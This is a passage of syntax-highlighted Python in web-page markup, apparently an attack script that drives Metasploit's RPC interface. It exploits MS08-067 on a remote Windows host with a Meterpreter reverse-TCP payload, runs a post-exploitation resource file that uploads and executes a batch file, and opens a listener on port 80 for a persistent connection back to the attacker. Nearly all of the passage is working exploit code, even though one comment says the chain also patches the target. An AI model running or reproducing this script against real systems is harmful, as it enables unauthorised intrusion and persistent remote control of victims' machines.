upload&nbsp;/tmp/ms08067_install.bat&nbsp;c:&#92;&#92; execute&nbsp;-f&nbsp;ms08067_install.bat &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batcomm&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;ms08067_patch.exe&nbsp;/quiet&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">postcomms</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">);</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">batcomm</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">();</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;Exploits&nbsp;the&nbsp;chain&nbsp;of&nbsp;rc&nbsp;files&nbsp;to&nbsp;exploit&nbsp;MS08-067,&nbsp;setup&nbsp;persistence,&nbsp;and&nbsp;patch</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">Msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(&#123;&#125;)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">login</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'msf'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'123'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ress&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.create'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console_id&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;ress</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'id'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Exploit&nbsp;MS08-067&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commands&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/windows/smb/ms08_067_netapi set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;RHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LPORT&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;ExitOnSession&nbsp;false exploit&nbsp;-z &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Exploiting&nbsp;MS08-067&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">commands</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;res</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'data'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">].</span><span style="box-sizing: border-box; color: #48484c" class="pln">split</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&#92;n'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Run&nbsp;Post-exploit&nbsp;script&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;runPost&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;post/multi/gather/run_console_rc_file set&nbsp;RESOURCE&nbsp;/tmp/smbpost.rc set&nbsp;SESSION&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Running&nbsp;post-exploit&nbsp;script&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">runPost</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Setup&nbsp;Listener&nbsp;for&nbsp;presistent&nbsp;connection&nbsp;back&nbsp;over&nbsp;port&nbsp;80&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">10</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/multi/handler set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;LPORT&nbsp;80 set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Setting&nbsp;up&nbsp;listener&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;:80&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">listen</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;lres&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;main</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">():</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;optparse</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">OptionParser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">argv</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #195f91" class="lit">0</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&nbsp;-p&nbsp;LPORT&nbsp;-r&nbsp;RHOST&nbsp;-l&nbsp;LHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-p'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'LPORT'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'specify&nbsp;a&nbsp;port&nbsp;to&nbsp;listen&nbsp;on'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-r'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'RHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'Specify&nbsp;a&nbsp;remote&nbsp;host'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-l'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'LHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'Specify&nbsp;a&nbsp;local&nbsp;host'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-s'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'session'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'specify&nbsp;session&nbsp;ID'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;args</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">parse_args</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">session &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">;</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">;</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">options</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">if</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">and</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">and</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">==</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">None</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">usage &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">exit</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">0</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">if</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;__name__&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" 